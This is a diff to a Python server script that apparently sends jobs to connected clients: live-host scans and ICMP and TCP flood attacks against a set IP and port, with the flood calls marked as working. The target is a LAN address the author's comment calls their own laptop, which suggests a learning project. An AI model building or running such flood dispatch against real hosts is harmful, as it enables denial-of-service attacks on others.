@@ -10,8 +10,8 @@
 # 3) detect all live IP addresses on a given subet. NOTE: name of function is checkAllIPs
 
 # ONE-TO-MANY
-# 1) execute an ICMP flood attack against a given IP or subnet
-# 2) execute a TCP flood attack against an IP or port
+# 1) execute an ICMP flood attack against a given IP or subnet NOTE: Name of function is ICMPFlood()
+# 2) execute a TCP flood attack against an IP or port NOTE: Name of function is TCPFlood()
 
 
 import socket
@@ -29,7 +29,7 @@ DISCONNECT_MSG = "!disconnect"
 # IP of my laptop so I can test on wireshark and see these packets
 TARGET_IP = '192.168.1.144'
 TARGET_IPBROADCAST = '192.168.1.144/24'  # will list all ips
-TARGET_PORT = '80'  # port num you're targeting
+TARGET_PORT = '5050'  # port num you're targeting
 TARGET_HOSTNAME = 'nouriddin'  # name of machine you want to check if it's online
 
 # function takes in a socket object and an address, this is unique to each client
@@ -57,15 +57,13 @@ def ClientHandler(addr, conn):
                 HELO_PROTO = EstablishConn(msg[0:7])
                 connected = HELO_PROTO
 
-            # TODO: send this once (and wait until client has completed the job)
+            # Send only one job!
 
             # conn.send(LookupNetworkConn(TARGET_IPBROADCAST))  # WORKS!
-            # conn.send(IsIPOnline(TARGET_IP, 'none'))  # WORKS!
+            conn.send(IsIPOnline(TARGET_IP, 'none'))  # WORKS!
             # conn.send(IsIPOnline('none', TARGET_HOSTNAME))  # WORKS!
-            # conn.send(TCPFlood(TARGET_IP, TARGET_PORT))  # TEST THIS ALONE AS IT ONLY STOPS WITH Ctrl+C
-            conn.send(ICMPFlood(TARGET_IP))  # WORKS!
-            # tells client it's done and that it can disconnect
-            # conn.send(DISCONNECT_MSG.encode(FORMAT))
+            # conn.send(TCPFlood(TARGET_IP, TARGET_PORT)) #WORKS!
+            # conn.send(ICMPFlood(TARGET_IP))  # WORKS!
             if msg == DISCONNECT_MSG:  # if client asks to disconnect it will disconnect
                 connected = False
     conn.close()
